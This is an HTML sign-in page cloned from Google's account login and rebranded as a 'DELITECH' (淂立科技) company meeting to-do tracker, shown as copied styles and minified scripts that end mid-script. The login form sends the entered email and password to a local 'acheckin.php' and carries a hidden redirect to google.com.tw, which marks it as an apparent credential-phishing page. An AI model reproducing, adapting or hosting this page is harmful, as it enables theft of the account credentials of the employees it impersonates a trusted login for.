
<link rel="shortcut icon" href="deli.ico"  type="image/x-icon" />
<!DOCTYPE html>
<html lang="zh">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <meta name="google" value="notranslate">
  <meta name="google-site-verification" content="LrdTUW9psUAMbh4Ia074-BPEVmcpBxF6Gwf0MSgQXZs">
  <title>登入 - DELITECH帳戶</title>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(//ssl.gstatic.com/ui/v1/menu/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  min-height: 16px;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {
  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
<style>
  .banner h1 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 42px;
  font-weight: 300;
  margin-top: 0;
  margin-bottom: 20px;
  }
  .banner h2 {
  font-family: 'Open Sans', arial;
  -webkit-font-smoothing: antialiased;
  color: #555;
  font-size: 18px;
  font-weight: 400;
  margin-bottom: 20px;
  }
  .signin-card {
  width: 274px;
  padding: 40px 40px;
  }
  .signin-card .profile-img {
  width: 96px;
  height: 96px;
  margin: 0 auto 10px;
  display: block;
  -moz-border-radius: 50%;
  -webkit-border-radius: 50%;
  border-radius: 50%;
  }
  .signin-card .profile-name {
  font-size: 16px;
  font-weight: bold;
  text-align: center;
  margin: 10px 0 0;
  min-height: 1em;
  }
  .signin-card .profile-email {
  font-size: 16px;
  text-align: center;
  margin: 10px 0 20px 0;
  min-height: 1em;
  }
  .signin-card input[type=email],
  .signin-card input[type=password],
  .signin-card input[type=text],
  .signin-card input[type=submit] {
  width: 100%;
  display: block;
  margin-bottom: 10px;
  z-index: 1;
  position: relative;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .signin-card #Email,
  .signin-card #Passwd,
  .signin-card .captcha {
  direction: ltr;
  height: 44px;
  font-size: 16px;
  }
  .signin-card #Email + .stacked-label {
  margin-top: 15px;
  }
  .signin-card #reauthEmail {
  display: block;
  margin-bottom: 10px;
  line-height: 36px;
  padding: 0 8px;
  font-size: 15px;
  color: #404040;
  line-height: 2;
  margin-bottom: 10px;
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  }
  .one-google p {
  margin: 0 0 10px;
  color: #555;
  font-size: 14px;
  text-align: center;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 60px;
  }
  .one-google img {
  display: block;
  width: 210px;
  height: 17px;
  margin: 10px auto;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .banner h1 {
  font-size: 38px;
  margin-bottom: 15px;
  }
  .banner h2 {
  margin-bottom: 15px;
  }
  .one-google p.create-account,
  .one-google p.switch-account {
  margin-bottom: 30px;
  }
  .signin-card #Email {
  margin-bottom: 0;
  }
  .signin-card #Passwd {
  margin-top: -1px;
  }
  .signin-card #Email.form-error,
  .signin-card #Passwd.form-error {
  z-index: 2;
  }
  .signin-card #Email:hover,
  .signin-card #Email:focus,
  .signin-card #Passwd:hover,
  .signin-card #Passwd:focus {
  z-index: 3;
  }
</style>
<style media="screen and (max-width: 580px)">
  .banner h1 {
  font-size: 22px;
  margin-bottom: 15px;
  }
  .signin-card {
  width: 260px;
  padding: 20px 20px;
  margin: 0 auto 20px;
  }
  .signin-card .profile-img {
  width: 72px;
  height: 72px;
  -moz-border-radius: 72px;
  -webkit-border-radius: 72px;
  border-radius: 72px;
  }
</style>
<style>
  .jfk-tooltip {
  background-color: #fff;
  border: 1px solid;
  color: #737373;
  font-size: 12px;
  position: absolute;
  z-index: 800 !important;
  border-color: #bbb #bbb #a8a8a8;
  padding: 16px;
  width: 250px;
  }
 .jfk-tooltip h3 {
  color: #555;
  font-size: 12px;
  margin: 0 0 .5em;
  }
 .jfk-tooltip-content p:last-child {
  margin-bottom: 0;
  }
  .jfk-tooltip-arrow {
  position: absolute;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  display: block;
  height: 0;
  position: absolute;
  width: 0;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplbefore {
  border: 9px solid;
  }
  .jfk-tooltip-arrow .jfk-tooltip-arrowimplafter {
  border: 8px solid;
  }
  .jfk-tooltip-arrowdown {
  bottom: 0;
  }
  .jfk-tooltip-arrowup {
  top: -9px;
  }
  .jfk-tooltip-arrowleft {
  left: -9px;
  top: 30px;
  }
  .jfk-tooltip-arrowright {
  right: 0;
  top: 30px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-color: #bbb transparent;
  left: -9px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-color: #a8a8a8 transparent;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter,.jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-color: #fff transparent;
  left: -8px;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplbefore {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowdown .jfk-tooltip-arrowimplafter {
  border-bottom-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplbefore {
  border-top-width: 0;
  }
  .jfk-tooltip-arrowup .jfk-tooltip-arrowimplafter {
  border-top-width: 0;
  top: 1px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-color: transparent #bbb;
  top: -9px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter,
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-color:transparent #fff;
  top:-8px;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplbefore {
  border-left-width: 0;
  }
  .jfk-tooltip-arrowleft .jfk-tooltip-arrowimplafter {
  border-left-width: 0;
  left: 1px;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplbefore {
  border-right-width: 0;
  }
  .jfk-tooltip-arrowright .jfk-tooltip-arrowimplafter {
  border-right-width: 0;
  }
  .jfk-tooltip-closebtn {
  background: url("//ssl.gstatic.com/ui/v1/icons/common/x_8px.png") no-repeat;
  border: 1px solid transparent;
  height: 21px;
  opacity: .4;
  outline: 0;
  position: absolute;
  right: 2px;
  top: 2px;
  width: 21px;
  }
  .jfk-tooltip-closebtn:focus,
  .jfk-tooltip-closebtn:hover {
  opacity: .8;
  cursor: pointer;
  }
  .jfk-tooltip-closebtn:focus {
  border-color: #4d90fe;
  }
</style>
<style media="screen and (max-width: 580px)">
  .jfk-tooltip {
  display: none;
  }
</style>
<style>
  .need-help-reverse {
  float: right;
  }
  .remember .bubble-wrap {
  position: absolute;
  padding-top: 3px;
  -o-transition: opacity .218s ease-in .218s;
  -moz-transition: opacity .218s ease-in .218s;
  -webkit-transition: opacity .218s ease-in .218s;
  transition: opacity .218s ease-in .218s;
  left: -999em;
  opacity: 0;
  width: 314px;
  margin-left: -20px;
  }
  .remember:hover .bubble-wrap,
  .remember input:focus ~ .bubble-wrap,
  .remember .bubble-wrap:hover,
  .remember .bubble-wrap:focus {
  opacity: 1;
  left: inherit;
  }
  .bubble-pointer {
  border-left: 10px solid transparent;
  border-right: 10px solid transparent;
  border-bottom: 10px solid #fff;
  width: 0;
  height: 0;
  margin-left: 17px;
  }
  .bubble {
  background-color: #fff;
  padding: 15px;
  margin-top: -1px;
  font-size: 11px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  #stay-signed-in {
  float: left;
  }
  #stay-signed-in-tooltip {
  left: auto;
  margin-left: -20px;
  padding-top: 3px;
  position: absolute;
  top: 0;
  visibility: hidden;
  width: 314px;
  z-index: 1;
  }
  .dasher-tooltip {
  position: absolute;
  left: 50%;
  top: 380px;
  margin-left: 150px;
  }
  .dasher-tooltip .tooltip-pointer {
  margin-top: 15px;
  }
  .dasher-tooltip p {
  margin-top: 0;
  }
  .dasher-tooltip p span {
  display: block;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .dasher-tooltip {
  top: 340px;
  }
</style>
  </head>
  <body>
  <div class="wrapper">
  <div  class="google-header-bar  centered">
  <div class="header content clearfix">
  
  </div>
  </div>
  <div  class="main content clearfix">
<div class="banner"> 
 <h1>
   DELITECH
</h1>
<h1>
   淂立科技會議待辦事項進度控管表
</h1>
  <h2 class="hidden-small">
  使用您的淂立帳戶登入
  </h2>
</div>
<div class="card signin-card clearfix">
  <div id="cc_iframe_parent"></div>
<img class="profile-img" src="//ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="">
<p class="profile-name"></p>
  <form novalidate method="post" action="acheckin.php" id="gaia_loginform">
  <input name="GALX" type="hidden"
           value="xvvyM3KFpDo">
  <input name="continue" type="hidden" value="https://www.google.com.tw/?gfe_rd=cr&amp;ei=hHFiVdqaNOu6mgXkwYG4Bw&amp;gws_rd=ssl">
  <input name="hl" type="hidden" value="zh-TW">

<label  class="hidden-label" for="ii">電子郵件</label>
<input  id="Email" name="ii" type="email"
       placeholder="電子郵件"
       value=""
       spellcheck="false"
       class="">
<label  class="hidden-label" for="pw">密碼</label>
<input  id="Passwd" name="pw" type="password"
       placeholder="密碼"
       class="">
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="登入">
  <label class="remember">
   
 
  
  </form>
</div>

  <script>
  (function(){
  var splitByFirstChar = function(toBeSplit, splitChar) {
  var index = toBeSplit.indexOf(splitChar);
  if (index >= 0) {
  return [toBeSplit.substring(0, index),
  toBeSplit.substring(index + 1)];
  }
  return [toBeSplit];
  }
  var langChooser_parseParams = function(paramsSection) {
  if (paramsSection) {
  var query = {};
  var params = paramsSection.split('&');
  for (var i = 0; i < params.length; i++) {
              var param = splitByFirstChar(params[i], '=');
              if (param.length == 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  <script>var G,Gb=function(a,b){var c=a;a&&"string"==typeof a&&(c=document.getElementById(a));if(b&&!c)throw new Ga(a);return c},Ga=function(a){this.id=a;this.toString=function(){return"No element found for id '"+this.id+"'"}};var Gc={},Gf=function(a,b,c){var d=function(a){var b=c.call(this,a);!1===b&&Gd(a);return b};a=Gb(a,!0);a.addEventListener(b,d,!1);Ge(a,b).push(d);return d},Gg=function(a,b,c){a=Gb(a,!0);var d=function(){var b=window.event,d=c.call(a,b);!1===d&&Gd(b);return d};a.attachEvent("on"+b,d);Ge(a,b).push(d);return d},Gh;Gh=window.addEventListener?Gf:window.attachEvent?Gg:void 0;var Gd=function(a){a.preventDefault?a.preventDefault():a.returnValue=!1;return!1};
var Ge=function(a,b){Gc[a]=Gc[a]||{};Gc[a][b]=Gc[a][b]||[];return Gc[a][b]};var Gi=function(){try{return new XMLHttpRequest}catch(a){for(var b=["MSXML2.XMLHTTP.6.0","MSXML2.XMLHTTP.3.0","MSXML2.XMLHTTP","Microsoft.XMLHTTP"],c=0;c<b.length;c++)try{return new ActiveXObject(b[c])}catch(d){}}return null},Gj=function(){this.request=Gi();this.parameters={}};
Gj.prototype.send=function(a,b){var c=[],d;for(d in this.parameters){var e=this.parameters[d];c.push(d+"="+encodeURIComponent(e))}var c=c.join("&"),f=this.request;f.open("POST",a,!0);f.setRequestHeader("Content-type","application/x-www-form-urlencoded");f.onreadystatechange=function(){4==f.readyState&&b({status:f.status,text:f.responseText})};f.send(c)};
Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
